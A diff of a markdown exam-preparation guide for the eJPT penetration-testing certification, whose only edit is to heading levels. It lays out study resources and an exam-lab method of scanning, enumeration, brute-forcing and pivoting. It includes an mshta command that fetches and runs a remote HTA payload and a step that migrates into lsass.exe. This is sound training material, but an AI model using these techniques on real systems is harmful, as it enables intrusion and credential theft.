@@ -37,29 +37,29 @@ Before you take the eJPT exam or training, you should have a good understanding 
 This is the section we’ve been waiting for.  
 First of all, when you purchase an eJPT voucher, they provide three months of training along with it. The training is sufficient for this certification. However, for proper preparation, I have some advice to follow:
 
-#### 1. Note-Taking:
+### 1. Note-Taking:
 Note-taking is a must. You need to take good notes on what you are learning. I recommend using the Cherry Tree note-taking app. It is offline and performs fast.  
 If you are using Cherry Tree, make sure to back up your notes regularly. Since it is stored locally, if your system crashes, you will lose all your notes.  
 I will share a great GitHub repository for notes: [EJPTv2 Notes](https://github.com/neilmadhava/EJPTv2-Notes.git).
 
-#### 2. Complete the Full Training:
+### 2. Complete the Full Training:
 The training “Penetration Testing Student” that comes with eJPT is enough for this certification. The course teaches everything a junior penetration tester needs to know. You will gain a solid understanding of penetration testing trends and methodologies. Each section comes with a practical lab environment where you can learn hands-on penetration testing.  
 If you cannot complete the training, that’s perfectly fine. You can complete the Junior Penetration Tester path on TryHackMe.  
 [Junior Penetration Tester Path](https://tryhackme.com/path/outline/jrpenetrationtester).
 
-#### 3. Master All Enumeration Techniques:
+### 3. Master All Enumeration Techniques:
 Master all enumeration techniques taught in the Penetration Testing Student course. Most of the exam questions are enumeration-based. Take detailed notes on each enumeration technique so you can use them during the exam. Some important protocols to focus on include FTP, SSH, HTTP, HTTPS, WebDAV, RDP, SMB, WinRM, and MySQL. You will likely not encounter other protocols.
 
-#### 4. Brute Forcing Techniques:
+### 4. Brute Forcing Techniques:
 You will need to perform a lot of brute-forcing during the exam. Familiarize yourself with brute-forcing tools like Hydra, Burp Suite Intruder, Metasploit login brute-force modules, WPScan brute-force, and login page brute-forcing. These will help you gain access to systems.
 
-#### 5. Hash Cracking:
+### 5. Hash Cracking:
 You may encounter scenarios where you need to crack NTLM, SHA512, MD5, or other hashes, or identify the hash type. Master tools like John the Ripper, Hashcat, and online hash-cracking tools such as:  
 - [CrackStation](https://crackstation.net/)  
 - [Hash Identifier](https://hashes.com/en/tools/hash_identifier)  
 - [MD5 Hashing](https://md5hashing.net/) (This tool is very useful for CTFs and eJPT).
 
-#### 6. Gaining Access with Shells:
+### 6. Gaining Access with Shells:
 You need a clear understanding of how reverse/bind shells work and how to gain access using them. Sometimes, you will need to modify and provide your IP and port in these shells.  
 Some resources for reverse/bind shells:  
 1. [Pentester Monkey](https://pentestmonkey.net/)  
@@ -67,24 +67,24 @@ Some resources for reverse/bind shells:
 3. `/usr/share/webshell/`  
 4. Msfvenom  
 
-#### 7. Privilege Escalation:
+### 7. Privilege Escalation:
 You need to know both Windows and Linux privilege escalation techniques to pass the exam. Familiarize yourself with the online resource “GTFOBins.” I will share some notes you can use during the eJPT exam:  
 - [Linux Privilege Escalation](https://github.com/Ignitetechnologies/Linux-Privilege-Escalation.git)  
 - [Windows Privilege Escalation](https://github.com/neilmadhava/EJPTv2-Notes/blob/main/Post-Exploitation/win-privesc.md)  
 - [GTFOBins](https://gtfobins.github.io/)  
 
-#### 8. Internal Network Penetration Testing:
+### 8. Internal Network Penetration Testing:
 In the eJPT exam, you will encounter questions related to internal network machines. You need to learn:  
 1. How to find an internal network after gaining access to a machine.  
 2. How to add an autoroute with Meterpreter.  
 3. How to perform port forwarding to scan the internal network with Nmap.  
 
-#### 9. Transferring Files:
+### 9. Transferring Files:
 To pass the eJPT exam, you must know how to transfer files to and from the target. You need to know:  
 1. Transferring files to a Windows target.  
 2. Transferring files to a Linux target.  
 
-#### 10. Web Enumeration and Attacks:
+### 10. Web Enumeration and Attacks:
 The eJPT exam covers some basic web attacks. You need to know about:  
 1. Web enumeration.  
 2. Directory brute-forcing.  
@@ -182,53 +182,53 @@ I believe these rooms will be enough to build your eJPT CTF mindset. Now, let’
 ## **5. What to Do During the Exam**  
 When you start the exam, you’ll need to follow some tips and tricks to complete all the machines. Here’s a guide to help you:  
 
-#### **Step 0: Save All 35 Questions in CherryTree**  
+### **Step 0: Save All 35 Questions in CherryTree**  
 - Start the exam and save all 35 questions in your CherryTree notes.  
 - After discovering all the targets, categorize the questions by machine.  
 
-#### **Step 1: Perform a Host Discovery Scan with Nmap**  
+### **Step 1: Perform a Host Discovery Scan with Nmap**  
 Run the following command to find all live hosts on your subnet:  
 ```bash
 nmap -sn 192.168.0.5/24 | grep "report for" | awk -F '[()]' '{print $2}' > livehosts.txt
 ```  
 This will save the live hosts to a text file, including your IP and gateway. Remove your IP and gateway from the file to avoid scanning your own machine. In my exam, there were 6 target machines.  
 
-#### **Step 2: Perform a Full TCP Port Scan**  
+### **Step 2: Perform a Full TCP Port Scan**  
 Run a full TCP port scan using the following command:  
 ```bash
 nmap -iL livehosts.txt -p- -T5
 ```  
 This will identify open ports on all targets. Save this information for each live host.  
 
-#### **Step 3: Perform an Aggressive Scan on Each Target**  
+### **Step 3: Perform an Aggressive Scan on Each Target**  
 Now that you’ve identified open ports, perform an aggressive scan on each target separately. For example, if the first machine has ports 21, 80, and 3389 open, run:  
 ```bash
 nmap 192.168.0.51 -p 21,80,3389 -A
 ```  
 This will provide detailed information about the target. Perform this scan for each machine and save the results in your notes. This information will help you answer questions and categorize them by target.  
 
-#### **Step 4: Note NetBIOS Names**  
+### **Step 4: Note NetBIOS Names**  
 Questions are based on NetBIOS names, not IP addresses. Save the NetBIOS name alongside the IP address in your notes, like this:  
 ```
 51 - WINSERVER01
 ```  
 
-#### **Step 5: Map Questions to Machines**  
+### **Step 5: Map Questions to Machines**  
 With all the information gathered, categorize the questions by specific targets. This will help you answer questions more effectively.  
 
-#### **Step 6: Perform Targeted Enumeration**  
+### **Step 6: Perform Targeted Enumeration**  
 Only perform the enumeration techniques required by the questions. Avoid random enumeration unless you’re stuck. For example, if a question asks for the web server version, focus on web enumeration rather than MySQL.  
 
-#### **Step 7: Check for Anonymous Access to FTP/SMB**  
+### **Step 7: Check for Anonymous Access to FTP/SMB**  
 - Enumerate whether the target allows anonymous or guest access to FTP and SMB ports.  
 - Use tools like `smbclient` or `enum4linux` to access shares, users, and groups.  
 
-#### **Step 8: HTTP Enumeration**  
+### **Step 8: HTTP Enumeration**  
 - Check for web servers on common ports (e.g., 80, 443) or uncommon ports (e.g., 8000, 8080).  
 - Look for `/robots.txt`, `/sitemap.xml`, and hidden directories using tools like `dirb` or `gobuster`.  
 - Use `wp-scan` and `nikto` to find plugins, users, and themes.  
 
-#### **Step 9: Exploit WebShells**  
+### **Step 9: Exploit WebShells**  
 If you find a web shell, use the following Metasploit module:  
 ```bash
 exploit/windows/misc/hta_server
@@ -238,7 +238,7 @@ Then execute the payload on the web shell:
 mshta.exe http://10.0.2.15:8080/bvp3U9De6.hta
 ```  
 
-#### **Step 10: Enumerate WebDAV**  
+### **Step 10: Enumerate WebDAV**  
 If WebDAV is enabled, check for directory listing using `davtest`:  
 ```bash
 davtest -auth bob:password_123321 -url http://192.168.0.51/webdav
@@ -248,7 +248,7 @@ If file uploads are supported, generate a shell with `msfvenom` and upload it us
 exploit/windows/iis/iis_webdav_upload_asp
 ```  
 
-#### **Step 11: Brute-Force Attacks**  
+### **Step 11: Brute-Force Attacks**  
 If you find any users during FTP or SMB enumeration, perform brute-force attacks on every possible protocol:  
 1. FTP brute-force  
 2. SSH brute-force  
@@ -258,28 +258,28 @@ If you find any users during FTP or SMB enumeration, perform brute-force attacks
 
 Use the password lists provided in the exam or the wordlists mentioned earlier.  
 
-#### **Step 12: Use Credentials Wisely**  
+### **Step 12: Use Credentials Wisely**  
 If you find credentials (e.g., FTP, SMB, or web login), use them to access SMB, SSH, or RDP sessions. For example, I found FTP credentials that allowed me to gain RDP access to the target.  
 
-#### **Step 13: Check Service Versions for Vulnerabilities**  
+### **Step 13: Check Service Versions for Vulnerabilities**  
 If you find a service version during enumeration:  
 1. Use `searchsploit` to check for vulnerabilities.  
 2. Search Metasploit for relevant exploits.  
 3. Search Google for publicly available exploits.  
 
-#### **Step 14: Upgrade Non-Interactive Shells**  
+### **Step 14: Upgrade Non-Interactive Shells**  
 If you get a non-interactive shell (e.g., PHP or Python shell), upgrade it to an interactive Meterpreter session:  
 ```bash
 sessions -u <session-id>
 ```  
 
-#### **Step 15: Post-Exploitation Tasks**  
+### **Step 15: Post-Exploitation Tasks**  
 After gaining access to a target:  
 1. Answer the questions related to that target.  
 2. Look for dynamic flags.  
 3. Check for internal networks.  
 
-#### **Step 16: Pivot to Internal Networks**  
+### **Step 16: Pivot to Internal Networks**  
 If you find an internal network:  
 1. Use Meterpreter to set up an autoroute:  
    ```bash
@@ -290,7 +290,7 @@ If you find an internal network:
    auxiliary/scanner/portscan/tcp
    ```  
 
-#### **Step 17: Port Forwarding**  
+### **Step 17: Port Forwarding**  
 To scan the internal network with Nmap, set up port forwarding:  
 ```bash
 portfwd add -l 1234 -p 80 -r 10.0.29.96
@@ -300,13 +300,13 @@ Then scan the forwarded port:
 nmap -A -p 1234 127.0.0.1
 ```  
 
-#### **Step 18: Migrate to LSASS in Meterpreter**  
+### **Step 18: Migrate to LSASS in Meterpreter**  
 If you gain access to a Windows system via Meterpreter, migrate to the `lsass.exe` process:  
 ```bash
 migrate -N lsass.exe
 ```  
 
-#### **Step 19: If You Get Stuck**  
+### **Step 19: If You Get Stuck**  
 If you’re stuck:  
 1. Take a break.  
 2. Search for write-ups on similar lab environments.  
